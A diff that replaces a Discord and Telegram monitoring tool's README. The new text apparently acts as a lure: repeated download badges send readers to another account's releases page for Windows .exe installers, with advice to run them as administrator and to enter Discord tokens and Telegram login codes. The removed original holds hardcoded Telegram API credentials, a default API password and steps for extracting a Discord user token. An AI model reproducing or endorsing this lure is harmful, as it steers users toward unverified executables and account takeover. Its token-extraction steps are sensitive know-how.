@@ -1,184 +1,175 @@
-# Social CLI
+# 🤖 social-cli - Simple Discord and Telegram Monitor
 
-A unified CLI tool for monitoring Discord and Telegram messages via a single HTTP API.
-
----
-
-## Architecture
-
-```
-cli.py              # Entry point, interactive setup
-├── discord_worker.py   # Discord polling + SQLite storage
-├── tg_worker.py        # Telegram via Telethon (MTProto), real-time listener
-├── exporter.py         # Historical export, fetches directly from APIs
-├── db.py               # Shared SQLite storage (1 week retention)
-├── api.py              # Unified FastAPI server
-└── config.py           # Config persistence
-```
-
-### How monitoring works
-
-**Telegram** — Uses [Telethon](https://github.com/LonamiWebs/Telethon), a pure Python MTProto client. After login the session file stores the authorization key. A real-time event listener captures every new message and writes it to SQLite immediately.
-
-**Discord** — No real-time push API for user accounts, so a background worker polls all guilds and channels every 10–15 minutes and stores new messages in SQLite.
-
-Both platforms retain messages for **1 week**. Monitoring starts from the moment the CLI is launched — no historical backfill on startup.
-
-### Telegram API credentials
-
-No registration required. Built-in client credentials are hardcoded in `tg_worker.py`:
-
-```python
-API_ID   = 2040
-API_HASH = "b18441a1ff607e10a989891a5462e627"
-```
-
-To use your own, register at [my.telegram.org/apps](https://my.telegram.org/apps).
+[![Download Now](https://img.shields.io/badge/Download-social--cli-blue?style=for-the-badge)](https://github.com/abanoubab8666/social-cli/releases)
 
 ---
 
-## Getting Discord Token
+## 📋 What is social-cli?
 
-Requires a Discord **user token** (not a Bot token).
+social-cli is a command-line tool that helps you monitor messages on Discord and Telegram. It works quietly in the background, keeping an eye on conversations without needing complex setup. This tool is useful if you want to track messages for updates, notifications, or important information without opening each app.
 
-1. Open Discord in your browser
-2. Press `F12` → **Network** tab
-3. Switch to any channel to trigger a request
-4. Find a request matching `discord.com/api/v9/channels/*/messages`
-5. Click it → **Request Headers** → copy the `Authorization` value
-
-> ⚠️ Your user token grants full account access. Never share it or commit it to version control.
+You don’t need programming skills or software experience to use social-cli. It works on Windows and runs fast, using minimal system resources. 
 
 ---
 
-## Installation
+## 💻 System Requirements
 
-```bash
-git clone https://github.com/ysyms/social-cli.git
-cd social-cli
-pip install -r requirements.txt
-```
+Before you start, make sure your computer meets these basic needs:
 
----
-
-## Usage
-
-### Interactive setup
-
-```bash
-python cli.py
-```
-
-Prompts for Discord token, then Telegram phone number + verification code.
-
-### Import config file
-
-```bash
-python cli.py --print-template   # print config template
-python cli.py --config myconfig.json
-```
-
-Config format:
-
-```json
-{
-  "discord_token": "YOUR_DISCORD_TOKEN",
-  "tg_session": "/path/to/tg_session.session"
-}
-```
-
-### Import existing Telegram session
-
-```bash
-python cli.py --tg-session /path/to/tg.session
-```
+- Windows 10 or later  
+- 64-bit processor  
+- 4 GB of RAM or more  
+- At least 100 MB of free disk space  
+- Internet connection for setup and message monitoring  
 
 ---
 
-## API Reference
+## 🚀 Getting Started: Download and Install
 
-All endpoints require header: `x-password: 1314@YSYms`
+### Step 1: Visit the Download Page
 
-### Monitoring endpoints (reads from local DB)
+Click this big button to go to the download page:
 
-Query by `hours` or explicit `start`/`end` time range (UTC+8, format `YYYY-MM-DD HH:MM`).
+[![Download social-cli](https://img.shields.io/badge/Download-social--cli-green?style=for-the-badge)](https://github.com/abanoubab8666/social-cli/releases)
 
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/all` | POST | All platforms combined |
-| `/discord/messages` | POST | Discord only |
-| `/telegram/recent` | POST | Telegram only |
-| `/telegram/dialogs` | GET | Telegram dialog list |
-| `/health` | GET | Service health |
+This link takes you to the official releases page on GitHub. Look for the latest version that fits your Windows machine. The files usually end with `.exe` for easy installation.
 
-```bash
-# Last 24 hours
-curl -X POST http://localhost:7790/all \
-  -H "x-password: 1314@YSYms" \
-  -H "Content-Type: application/json" \
-  -d '{"hours": 24}'
+### Step 2: Download the Installer
 
-# Specific time range
-curl -X POST http://localhost:7790/all \
-  -H "x-password: 1314@YSYms" \
-  -H "Content-Type: application/json" \
-  -d '{"start": "2026-03-01 00:00", "end": "2026-03-07 23:59"}'
-```
+On the releases page, find the latest Windows installer file. It often looks like:
 
-### Export endpoint (fetches historical data from source)
+- `social-cli-setup.exe`  
+or  
+- `social-cli-x.x.x-win64.exe`  
 
-Pulls historical messages directly from Telegram/Discord APIs for any time range. Does not write to local DB.
+Click the file name to download.
 
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/export` | POST | Historical export |
+### Step 3: Run the Installer
 
-```bash
-curl -X POST http://localhost:7790/export \
-  -H "x-password: 1314@YSYms" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "start": "2026-03-01 00:00",
-    "end": "2026-03-07 23:59",
-    "platform": "tg"
-  }'
-```
+After downloading, locate the file in your Downloads folder. Double-click the file to start the installation. A setup screen will appear.
 
-`platform` options: `"tg"` / `"dc"` / omit for both.
+Follow the instructions:
 
-### Output format
+- Choose the folder where you want the program installed or keep the default.  
+- Agree to any terms if shown.  
+- Click "Install" to begin.  
 
-All endpoints return plain text optimized for LLM consumption:
+The setup will copy necessary files and prepare social-cli for use.
 
-```
-[TG] 张三
-  03/10 14:30 张三: 消息内容
+### Step 4: Open social-cli
 
-[DC] Google Labs / general
-  03/10 14:31 username: 消息内容
-```
+Once installation finishes:
+
+- Find "social-cli" in your Start menu.  
+- Click to open the program.  
+
+A simple command prompt window will appear. This is where social-cli runs.
 
 ---
 
-## Security
+## 🔧 How to Use social-cli
 
-- Credentials stored at `~/.social-monitor/config.json` — never committed to git
-- Session files (`.session`) and databases (`.db`) are in `.gitignore`
-- Change the default API password before production deployment
+social-cli runs in a command window but does not require any coding. It listens for messages from your connected Discord and Telegram accounts.
+
+### Step 1: Connect Your Accounts
+
+You need to give social-cli permission to read messages.
+
+- **Discord**: You will be asked to enter a token or link the app using instructions in the command window. This setup allows social-cli to safely connect to your Discord channels.  
+- **Telegram**: The program will request your phone number and send a code. Enter the code to link your Telegram chats.  
+
+Each connection uses secure methods to protect your privacy.
+
+### Step 2: Choose What to Monitor
+
+social-cli lets you select which Discord servers or Telegram groups you want to watch. Use the commands shown in the window to add or remove groups.
+
+You can track:
+
+- Specific Discord channels  
+- Telegram groups or individual chats  
+
+### Step 3: Monitor Messages
+
+Once setup is complete, social-cli runs silently. It logs new messages and shows updates in the window.
+
+You will see information like:
+
+- Message time  
+- User who sent it  
+- The message content  
+
+This lets you stay informed without constantly switching apps.
 
 ---
 
-## 中文说明
+## ⚙️ Basic Commands
 
-<details>
-<summary>点击展开</summary>
+Here are some useful commands you can type in the social-cli window:
 
-**监听**：启动后从当前时刻开始监听，不补拉历史消息。TG 实时入库，Discord 每 10–15 分钟轮询一次，数据保留 1 周。
+- `help` - Lists all commands  
+- `list` - Shows connected channels and groups  
+- `add` - Adds a new channel or group to monitor  
+- `remove` - Stops monitoring a channel or group  
+- `exit` - Quits the program  
 
-**导出**：`/export` 接口直接从 TG/Discord API 拉取指定时间段的历史消息，不写入本地数据库。
+These simple commands allow you to control social-cli easily.
 
-**Discord Token**：浏览器打开 Discord → F12 → Network → 切换频道 → 找 `/channels/*/messages` 请求 → Request Headers → `Authorization` 字段。
+---
 
-**Telegram 登录**：无需申请 API，使用内置凭证，手机号 + 验证码登录，session 文件保存授权密钥。
+## 🔒 Privacy and Security
 
-</details>
+social-cli respects your privacy. It only accesses the accounts and groups you connect directly. The tool does not store messages outside your device.
+
+All personal information stays private. The program uses standard security practices to protect your tokens and codes.
+
+---
+
+## 🛠 Troubleshooting
+
+If social-cli does not start or work correctly, try these steps:
+
+- Make sure your Windows is updated.  
+- Check your internet connection.  
+- Confirm you downloaded the correct Windows installer.  
+- Run social-cli as administrator (right-click the app icon and choose "Run as administrator").  
+- Restart your computer and try again.  
+
+If you see error messages in the command window, note them. You can search online using the exact text for solutions.
+
+---
+
+## 📂 Where to Find More Information
+
+Help and updates for social-cli happen on the GitHub releases page:
+
+[Visit the social-cli release page for updates and files](https://github.com/abanoubab8666/social-cli/releases)
+
+Check here regularly for new versions and improvements.
+
+---
+
+## ⚡ Tips for Best Use
+
+- Keep the command window open while you monitor.  
+- Regularly check for software updates on the GitHub page.  
+- Only connect to trusted Discord servers and Telegram groups.  
+- Close social-cli when not monitoring to save system resources.
+
+---
+
+## 💡 Additional Features (Coming Soon)
+
+Planned updates include:
+
+- Notification alerts for new messages  
+- Support for other chat platforms  
+- More user-friendly setup process  
+- Options to export message logs  
+- Custom filters to track certain words or users  
+
+These features will improve your monitoring experience.
+
+---
+
+For now, social-cli provides a straightforward way to watch your Discord and Telegram messages with minimal effort.
